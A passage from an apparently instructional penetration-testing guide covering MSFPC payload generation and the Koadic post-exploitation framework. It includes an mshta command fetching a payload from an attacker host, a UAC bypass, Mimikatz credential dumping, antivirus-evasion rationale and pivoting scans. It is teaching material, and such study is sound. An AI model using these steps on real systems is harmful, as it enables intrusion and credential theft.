# .rc File and Payloads in Metasploit

Let's examine the `.rc` file generated by the preceding command:

![](media/image83.jpeg)

The payload is set to `windows/shell_bind_tcp`, which is a stageless payload. A staged payload in Metasploit would be `windows/shell/bind_tcp`.

### Communication Methods
- **TCP/HTTP/HTTPS/FIND_PORT**: These options specify the communication method required by the payload to connect with the payload handler.

  - **TCP**: This is the standard communication method once the payload is executed on the target server. It can be used with any type of payload and format but is easily detectable by IDS and can be blocked by firewalls and IPS due to its unencrypted nature.
  
  - **HTTP**: If this option is used, the payload will use HTTP for communication. Instead of using a specific TCP port, the payload will communicate on port 80. This can bypass firewalls if only port 80 is open on the target system. However, it can still be detected by IDS and blocked by IPS due to its unencrypted nature.
  
  - **HTTPS**: This option is used when generating a payload that will use SSL communication. It is recommended for stealthy reverse connections.
  
  - **FIND_PORT**: This option is used when common ports (80, 443, 53, 21) are not available for reverse connections. If set, MSFPC will generate a payload that tries all 1-65535 ports for communication.

### Batch and Loop Modes
MSFPC can generate multiple payloads with a single command using either the BATCH Mode or LOOP Mode.

- **BATCH Mode**: In this mode, MSFPC can generate multiple payloads with various combinations of payload types. For example:
  ```sh
  ./msfpc batch windows en0
  ```
  ![](media/image85.jpeg)
  MSFPC generates all possible payload combinations for Windows with their respective resource files (.rc):
  ![](media/image86.png)

- **LOOP Mode**: This mode generates multiple payloads of all types. It can also generate payloads for a given LHOST, useful when the target OS is unknown. Example command:
  ```sh
  ./msfpc.sh loop 192.168.10.122
  ```
  ![](media/image87.jpeg)
  ![](media/image88.jpeg)
  MSFPC generates payloads with default values for all payload types and their respective resource files (.rc).

- **VERBOSE Option**: This option provides more detailed information about the values used by MSFPC while generating a payload. Example command:
  ```sh
  ./msfpc.sh loop 192.168.10.122 8080 verbose
  ```
  ![](media/image89.jpeg)
  In this case, LOOP mode is used to generate payloads with LPORT set to 8080.

### Tool Updates
The features of the tool are updated and maintained via its repository. It is highly recommended to check for updates online every two weeks.

# Koadic

Koadic is a Windows post-exploitation toolkit with an interface similar to Empire and Metasploit. It uses the **Component Object Model (COM)** in Windows and operates using the script host utility (JScript/VBScript). COM objects were introduced by Microsoft in 1993, making Koadic's payloads compatible with older versions of Windows (NT/95/2000) up to the latest version, Windows 10.

Koadic is built on Python and is compatible with both Python 2 and Python 3. The payloads can be executed completely in-memory and support stager communication over SSL/TLS, depending on the victim OS settings.

![](media/image90.jpeg)

## Installation

To install Koadic, clone the repository from GitHub:
```sh
git clone https://github.com/zerosum0x0/koadic
```
List the files in the Koadic directory:
```sh
ls -alh
```
![](media/image91.png)

Install the required Python packages using:
```sh
sudo pip install -r requirements.txt
```
![](media/image92.jpeg)

Once the installation is complete, run Koadic with:
```sh
./koadic
```
![](media/image93.jpeg)

Koadic starts with the MSHTA stager as the default stager. The **Microsoft HTML Application (MSHTA)** is a full-fledged Microsoft Windows HTML application trusted by the developer who creates it. It is like Internet Explorer without the user interface or strict security model, displaying only a few options such as menus, icons, title information, and toolbars.

### Why Use MSHTA as the Dropper Payload?

One of the main reasons for using MSHTA for payload delivery is its support for scripting languages like VBScript and JScript. Unlike PowerShell, which has become increasingly monitored and restricted, MSHTA is less likely to be detected by modern antivirus solutions. Additionally, MSHTA is supported in older versions of Windows, making it a more reliable dropper than PowerShell.

### Terminology

- **Zombies**: Compromised systems that connect back to the Koadic Command and Control (C2) server, similar to sessions in Metasploit.
- **Stagers**: The C2 web server from where the payload and implants are fetched by zombies. Stagers maintain the connection between zombies and Koadic using multiple HTTP connections.
- **Implants**: JavaScript or VBScript code executed by zombies to perform specific tasks, similar to post modules in Metasploit. Implants are categorized into pivot, persistence, manage, utils, elevate, gather, scan, fun, and inject.
- **Jobs**: Tasks created by the C2 when executing an implant on a zombie. Once a job is completed, C2 is notified and the results are displayed on the C2 panel.

To start using Koadic, execute the help command:
```sh
?
```
![](media/image94.jpeg)

This will show all the commands supported by the Koadic C2 with their descriptions.

### Stages of Post-Exploitation

1. **Stager Establishment**: Set up the stager web server for zombie connections.
2. **Payload Execution**: Drop and execute the payload on the target server to hook up the zombie.
3. **Running Implants**: Execute implants to gather domain information, gain SYSTEM access, and obtain NTLM hashes.
4. **Pivoting**: Use the zombie to move around the network.

### Stager Establishment

Configure the stager by setting up the required details. To view the current stager information, use:
```sh
info
```
![](media/image96.jpeg)

Change the stager web server port to 8080:
```sh
set SRVPORT 8080
```
![](media/image97.jpeg)

Start the stager web server:
```sh
run
```
![](media/image98.jpeg)

The stager is now listening on port 8080. Use the provided command to execute on the target system:
```sh
mshta http://192.168.10.122:8080/MDRV9
```

### Payload Execution

Use different means of transport (e.g., MS Word, PDF, EXE, DLL) to deliver the payload. Once executed, the stager hooks up the zombie, and Koadic C2 is notified. System information is shared between the zombie and the stager.

To check connected zombies:
```sh
zombies
```
![](media/image101.jpeg)

For more information on a specific zombie:
```sh
zombies 1
```
![](media/image102.jpeg)

### Running Implants

Use the `bypassuac_eventvwr` implant to escalate privileges:
```sh
use implant/elevate/bypassuac_eventvwr
```

Configure the implant:
```sh
info
set payload 0
```
![](media/image104.jpeg)

Run the implant:
```sh
run
```
![](media/image106.jpeg)
![](media/image107.jpeg)

### Using Mimikatz

Inject the Mimikatz DLL into memory:
```sh
use implant/inject/mimikatz_dynwrapx
run
```
![](media/image109.jpeg)

Fetch NTLM hashes for further pivoting.

### Executing Commands

Use the `exec_cmd` implant to run commands on the zombie:
```sh
use implant/manage/exec_cmd
set cmd "net user"
run
```
![](media/image111.jpeg)

### Pivoting

Access the 192.168.10.171 system and use its credentials to move around the network. Use the `tcp scanner` implant for port scanning:
```sh
use implant/scan/tcp
info
set rports 135,139,445
set rhosts 192.168.10.130
set zombie 0
run
```
![](media/image113.jpeg)

The mentioned ports are open, allowing access to the Remote Procedure Call (RPC) server on port 445.